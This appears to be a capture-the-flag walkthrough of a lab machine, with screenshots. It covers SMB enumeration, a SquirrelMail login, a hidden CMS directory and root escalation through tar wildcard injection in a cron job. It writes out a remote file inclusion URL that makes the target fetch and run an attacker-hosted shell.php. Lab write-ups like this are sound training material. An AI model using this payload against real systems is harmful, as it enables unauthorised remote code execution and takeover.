When scanning the ports, you will see the SMB port.

<img width="2559" height="1032" alt="image" src="https://github.com/user-attachments/assets/cd59fd97-e817-4fbc-a1ca-c4791ca9509e" />

When the SMB boots up, it will find two files containing the username and password. Then, I will scan the folder to find this page, try the username and password found, and successfully log in.

<img width="2556" height="768" alt="image" src="https://github.com/user-attachments/assets/dba078e3-199d-4b8a-88f5-8016f7366163" />

As you can see, this page is using Squirrelmail 1.4.23, and the email contains Miles Dyson's SMB password.

<img width="1833" height="391" alt="image" src="https://github.com/user-attachments/assets/42093ffb-cf0b-42c3-9025-b62b2e541bd8" />

By accessing Miles' SMB, they found a text file containing the hidden web directory. Then, using GoBuster to scan it again, they found the login page.

<img width="2559" height="1181" alt="image" src="https://github.com/user-attachments/assets/c8ce30ee-1b3b-40c5-8efa-af6801d41f6f" />

Since I don't have the username and password to log in, I searched Google for CMS and found this error.

<img width="2559" height="1134" alt="image" src="https://github.com/user-attachments/assets/357867fd-dcbe-49c7-8a5a-6d29d6fc9c97" />

You can then insert the URL from your machine and execute that file on the server: http://<TARGET_MACHINE_IP_NUMBER>/45kra24zxs28v3vd/administrator/alerts/alertConfigField.php?urlConfig=http://<YOUR_IP>:8000/shell.php

<img width="2559" height="1120" alt="image" src="https://github.com/user-attachments/assets/77879560-5c54-4a2a-a581-65eb0742ca59" />

I found these two directories, and when I read their crontab files, I saw that the files were running automatically. So, can I exploit this to open bash as root?

<img width="2331" height="548" alt="image" src="https://github.com/user-attachments/assets/5f463535-e718-42fe-9b56-b0238d65be38" />

This is a Tar Wildcard Injection vulnerability. Since I'm a www-data user, I can only create files in /var/www/html. After entering the commands shown in the image, wait for it to repeat the schedule. Once you see that the root user has 's' privileges, open bash.

<img width="2559" height="1093" alt="image" src="https://github.com/user-attachments/assets/e0a674cc-a9c6-49a5-b1eb-ff4f86e8f28a" />
<img width="2559" height="593" alt="image" src="https://github.com/user-attachments/assets/effa262f-42a1-45c3-93aa-2316774c2470" />


















